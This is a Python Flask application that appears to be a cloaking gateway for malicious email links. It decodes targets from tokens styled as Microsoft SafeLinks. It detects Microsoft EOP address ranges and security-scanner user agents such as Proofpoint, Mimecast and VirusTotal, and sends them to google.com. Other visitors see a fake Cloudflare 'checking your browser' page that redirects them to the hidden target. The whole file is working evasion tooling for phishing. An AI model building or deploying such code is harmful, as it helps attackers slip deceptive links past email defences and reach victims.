import os
import time
import json
import secrets
import base64
import logging
from ipaddress import ip_address, ip_network
from urllib.parse import quote

from flask import (
    Flask, request, redirect, render_template_string,
    abort, make_response, jsonify,
)
from itsdangerous import URLSafeTimedSerializer, BadSignature, SignatureExpired

# ---------------------------------------------------------------------------
# config
# ---------------------------------------------------------------------------
SK = os.environ.get("SECRET_KEY", "7b311b50f8306ae1fbe13f4db9b030267f77f3cc0020889b8cb583895afb443e")
GATE_TTL = int(os.environ.get("GATE_TTL_SECONDS", "900"))
UNWANTED_REDIRECT_URL = os.environ.get("UNWANTED_REDIRECT_URL", "https://www.google.com")

app = Flask(__name__)
app.secret_key = SK.encode()
cookie_serializer = URLSafeTimedSerializer(app.secret_key, salt="cookie-gate")

# ---------------------------------------------------------------------------
# scanner networks
# ---------------------------------------------------------------------------
EOP = [ip_network("40.92.0.0/15"), ip_network("40.107.0.0/16"), ip_network("52.100.0.0/14"), ip_network("104.47.0.0/17"), ip_network("13.107.6.152/31"), ip_network("13.107.18.10/31"), ip_network("13.107.128.0/22"), ip_network("23.103.160.0/20")]
SCANNER_NETS = {"microsoft_eop": EOP}

SCANNER_UA_TOKENS = ("microsoft office", "safelinks", "proofpoint", "mimecast", "barracuda", "talos", "urlscan", "virustotal", "curl/", "wget/", "python-requests")

def client_ip() -> str:
    xff = request.headers.get("X-Forwarded-For", "")
    return xff.split(",")[0].strip() if xff else request.remote_addr or ""

def classify(ip: str, ua: str) -> dict:
    out = {"scanner": False, "source": None}
    low = ua.lower()
    try:
        a = ip_address(ip)
        for name, nets in SCANNER_NETS.items():
            if any(a in n for n in nets):
                out["scanner"] = True
                out["source"] = name
                return out
    except ValueError:
        pass

    for tok in SCANNER_UA_TOKENS:
        if tok in low:
            out["scanner"] = True
            out["source"] = tok
            return out
    return out

def parse_payload_from_eop(eop_string):
    if not eop_string.startswith("u001."): return None
    try:
        clean = eop_string[5:].replace("-3D-3D", "").replace("-2F", "").replace("-3D", "").replace("-3A", "").replace("-2B", "")
        b64_payload = clean.split("-")[-1]
        padding = '=' * (-len(b64_payload) % 4)
        return json.loads(base64.urlsafe_b64decode(b64_payload + padding).decode('utf-8'))
    except Exception:
        return None

def _static_page(title: str, text: str, status_code: int):
    html = f"<html><body><h1>{title}</h1><p>{text}</p></body></html>"
    return make_response(html, status_code)

# --- FIXED LANDING PAGE: INLINE CSS INCLUDED ---
LANDING = """<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Just a moment...</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f7f7f7; color: #333; margin: 0; display: flex; flex-direction: column; min-height: 100vh; justify-content: center; align-items: center; }
        .main-wrapper { text-align: center; max-width: 600px; padding: 20px; }
        h1 { font-size: 24px; font-weight: 500; margin-bottom: 20px; }
        p { font-size: 16px; color: #666; margin-bottom: 30px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #challenge-form { display: none; }
        .footer { position: absolute; bottom: 20px; font-size: 12px; color: #999; }
    </style>
    <script>
        // Simulate a successful check and redirect after 3 seconds
        window.onload = function() {
            setTimeout(function() {
                document.getElementById("challenge-form").submit();
            }, 3000);
        }
    </script>
</head>
<body>
    <div class="main-wrapper">
        <div class="spinner"></div>
        <h1>Checking your browser before accessing the site.</h1>
        <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
        <p>Please allow up to 5 seconds&hellip;</p>
        
        <form id="challenge-form" method="POST" action="{{ action }}">
            <input type="hidden" name="n" value="{{ nonce }}">
            <input type="hidden" name="t" value="{{ token }}">
        </form>
    </div>
    <div class="footer">DDoS protection by Cloudflare</div>
</body>
</html>"""

@app.route("/ls/<path:token>", methods=["GET"])
def landing(token: str):
    if not token.startswith("click_upn="):
        return _static_page("Invalid link", "This link is not valid.", 404)
        
    eop_token = token.replace("click_upn=", "")
    data = parse_payload_from_eop(eop_token)
    
    if not data or "target" not in data:
        return _static_page("Invalid link", "Could not parse target.", 404)

    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
    if tag["scanner"]:
        return redirect(data.get("unwanted", UNWANTED_REDIRECT_URL), code=302)

    nonce_payload = {"t": eop_token, "ts": time.time()}
    nonce_blob = cookie_serializer.dumps(nonce_payload)

    html = render_template_string(LANDING, action=f"/submit/{quote(eop_token)}", token=eop_token, nonce=nonce_blob)
    resp = make_response(html)
    
    is_https = (request.headers.get("X-Forwarded-Proto", "http") == "https" or request.is_secure)
    resp.set_cookie("gate_session", nonce_blob, max_age=GATE_TTL, httponly=True, secure=is_https, samesite="None", path="/")
    return resp

@app.route("/submit/<path:token>", methods=["POST"])
def execute(token: str):
    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
    if tag["scanner"]:
        return redirect(UNWANTED_REDIRECT_URL, code=302)

    submitted_blob = request.form.get("n", "")
    if not submitted_blob:
        return _static_page("Missing Context", "Verification payload missing.", 400)

    try:
        nonce_data = cookie_serializer.loads(submitted_blob, max_age=GATE_TTL)
    except:
        return _static_page("Session Expired", "Verification context expired.", 400)

    if not secrets.compare_digest(nonce_data.get("t", ""), token):
        return _static_page("Verification Failed", "Verification payload mismatched.", 400)

    data = parse_payload_from_eop(token)
    if not data or "target" not in data:
         return _static_page("Invalid link", "Could not parse target.", 404)

    resp = make_response(redirect(data["target"], code=303))
    resp.delete_cookie("gate_session", path="/")
    return resp

@app.route("/health")
def health(): return jsonify({"ok": True})

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
